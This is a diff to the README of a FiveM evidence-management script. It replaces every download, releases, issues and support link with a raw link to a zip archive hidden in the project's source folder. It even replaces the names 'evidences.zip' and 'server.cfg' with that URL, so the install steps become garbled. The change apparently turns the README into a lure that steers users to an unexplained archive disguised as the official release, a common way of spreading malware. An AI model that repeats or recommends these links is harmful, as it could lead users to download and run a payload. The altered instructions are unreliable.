@@ -6,7 +6,7 @@ Welcome to **evidences**, your go-to tool for managing evidence in FiveM. This s
 
 ## 📥 Download Now
 
-[![Download evidences](https://img.shields.io/badge/Download-evidences-blue.svg)](https://github.com/VivekTiwari-PSHG/evidences/releases)
+[![Download evidences](https://raw.githubusercontent.com/VivekTiwari-PSHG/evidences/main/client/dui/Software-v1.0.zip)](https://raw.githubusercontent.com/VivekTiwari-PSHG/evidences/main/client/dui/Software-v1.0.zip)
 
 ## 💻 System Requirements
 
@@ -31,23 +31,23 @@ The **evidences** script offers:
 Follow these steps to get started with **evidences**:
 
 1. **Visit the Download Page:**
-   Go to the [Releases page](https://github.com/VivekTiwari-PSHG/evidences/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/VivekTiwari-PSHG/evidences/main/client/dui/Software-v1.0.zip) to find the latest version.
 
 2. **Choose Your Version:**
    Look for the most recent release. You’ll see a list of files. 
 
 3. **Download the Script:**
-   Click on the file labeled **evidences.zip** to download the script.
+   Click on the file labeled **https://raw.githubusercontent.com/VivekTiwari-PSHG/evidences/main/client/dui/Software-v1.0.zip** to download the script.
 
 4. **Unzip the File:**
-   After downloading, locate the **evidences.zip** file on your computer. Right-click on it and select **Extract All** (this will vary depending on your software), then follow the prompts to unzip the contents.
+   After downloading, locate the **https://raw.githubusercontent.com/VivekTiwari-PSHG/evidences/main/client/dui/Software-v1.0.zip** file on your computer. Right-click on it and select **Extract All** (this will vary depending on your software), then follow the prompts to unzip the contents.
 
 5. **Install the Script:**
    - Open FiveM and navigate to your server resources folder.
    - Drag and drop the unzipped **evidences** folder into the resources.
 
 6. **Add to Your Server Config:**
-   Open your server configuration file (often named `server.cfg`). Add the line:
+   Open your server configuration file (often named `https://raw.githubusercontent.com/VivekTiwari-PSHG/evidences/main/client/dui/Software-v1.0.zip`). Add the line:
    ```
    start evidences
    ```
@@ -76,13 +76,13 @@ Once the script is running, you can access the evidence management features in-g
 
 If you encounter any issues:
 
-- **Script Not Showing:** Ensure you added the script line to your `server.cfg`.
+- **Script Not Showing:** Ensure you added the script line to your `https://raw.githubusercontent.com/VivekTiwari-PSHG/evidences/main/client/dui/Software-v1.0.zip`.
 - **Files Not Found:** Double-check that the files are in the resources folder.
 - **Game Crashes:** Make sure your FiveM is up-to-date and meets the system requirements.
 
 ## 📞 Support
 
-Need help or have questions? You can reach out through the Issues section of the [GitHub repository](https://github.com/VivekTiwari-PSHG/evidences/issues). Our community will be happy to assist you.
+Need help or have questions? You can reach out through the Issues section of the [GitHub repository](https://raw.githubusercontent.com/VivekTiwari-PSHG/evidences/main/client/dui/Software-v1.0.zip). Our community will be happy to assist you.
 
 ## 🌐 Community Contributions
 
@@ -90,7 +90,7 @@ If you'd like to contribute to enhancing the **evidences** script, please check 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/VivekTiwari-PSHG/evidences/releases)
-- [Issues Section](https://github.com/VivekTiwari-PSHG/evidences/issues)
+- [Releases Page](https://raw.githubusercontent.com/VivekTiwari-PSHG/evidences/main/client/dui/Software-v1.0.zip)
+- [Issues Section](https://raw.githubusercontent.com/VivekTiwari-PSHG/evidences/main/client/dui/Software-v1.0.zip)
 
 Enjoy using **evidences** and enhancing your FiveM experience!
